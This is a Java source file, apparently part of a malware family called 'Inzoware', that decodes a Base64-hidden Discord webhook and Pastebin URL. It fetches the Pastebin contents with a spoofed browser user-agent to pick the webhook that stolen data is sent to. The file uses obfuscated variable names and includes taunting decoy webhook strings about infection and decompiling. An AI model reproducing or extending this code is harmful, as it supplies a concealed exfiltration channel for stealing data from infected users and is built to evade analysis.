package com.inzo.technologies.inzoware.hooks;


import java.io.InputStream;
import java.net.URL;
import java.util.ArrayList;
import java.util.Random;
import java.util.Scanner;
import java.util.Base64.Decoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.io.File;

import javax.net.ssl.HttpsURLConnection;

public class Hooks374 {

	
	public static ArrayList<String> realHooks = new ArrayList<>();
	public static ArrayList<String> INZOWEBHOOK = new ArrayList<String>();
	public static String lIIlIlIll = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTI2OTE3NTc2NDI3MTk2NDY2L3pSNl9veVZJNXdOVldBdHNSZ1FMSWNwRTE0a2hSUnA5MmxSV3JucHJET0lTZlZoaTAxTFp6U1Y2R3RQNXlSS2dVT3Bn"; // discord webhoook url encoded in base64
	public static String IIllIlIll = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0RVYjBIM3R1"; // pastebin url encoded in base64

	public static String getyou() {

		Base64.Decoder dec = Base64.getDecoder(); 
		String IIllIlIlI = new String(dec.decode(IIllIlIll));
		String IllIlIlIl = new String(dec.decode(lIIlIlIll));

		if(IIllIlIlI != "") {
			if(IIllIlIlI.contains("pastebin") && IIllIlIlI.contains("raw")) {
				try {
					String userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
					URL url = new URL(IIllIlIlI);
					HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
					connection.setDoOutput(true);
					connection.setRequestMethod("GET");
					InputStream response = connection.getInputStream();
					try(Scanner scanner = new Scanner(response)){
						String responseBody = scanner.useDelimiter("\\A").next();
						INZOWEBHOOK.add(responseBody);
					}catch(Exception e) {
						
					}
				}catch(Exception e) {
					
				}
				
			}else {
				
			}
		}else {
			INZOWEBHOOK.add(IllIlIlIl);
		}
		realHooks.add("https://discord.com/api/webhooks/INZO-WARE/YOU-HAVE-BEEN-INFECTED");
		realHooks.add("https://discord.com/api/webhooks/INZO-WARE/INJECTION-COMPLETED");
		realHooks.add("https://discord.com/api/webhooks/INZO-WARE/YOU-HAVENT-OF-TRIED-TO-DECOMPILE-THIS");
		Random r = new Random();
		int picked = r.nextInt(INZOWEBHOOK.size());
		String InzoItem = INZOWEBHOOK.get(picked);
		return InzoItem;
	}

}
